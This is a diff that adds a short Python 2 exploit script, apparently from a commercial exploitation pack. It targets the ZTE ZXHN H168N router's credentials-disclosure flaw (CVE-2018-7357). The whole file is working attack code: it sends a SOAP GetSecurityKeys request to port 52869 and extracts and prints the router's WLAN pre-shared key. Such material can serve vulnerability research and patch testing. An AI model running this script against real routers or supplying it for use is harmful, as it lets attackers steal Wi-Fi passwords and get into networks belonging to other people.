@@ -1,0 +1,50 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_zte_2'
+_vendor_ = 'zte'
+_model_  = ['ZXHN H168N']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2018-7357'
+_ref_    = 'https://packetstormsecurity.com/files/150728/ztehg-bypass.txt'
+_port_   = 52869
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/control/igd/wlanc_1_1' % (host,port)    
+    headers = {'SOAPACTION': '"urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"', 'Content-Type':'text/xml; charset="utf-8"'}
+    data = '<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:GetSecurityKeys xmlns:u="urn:dslforum-org:service:WLANConfiguration:1"></u:GetSecurityKeys></s:Body></s:Envelope>'
+    response = requests.post(url, headers=headers, data=data)                    
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return
+  if 'NewPreSharedKey' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.search('<NewPreSharedKey>([^<]+)</NewPreSharedKey>', response.text)
+    if m is None:
+      print '[+] Credentials not found'
+      print response.text        
+    else:           
+      print 'WLAN password: %s\n'%m.group(1)
+      print response.text 
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
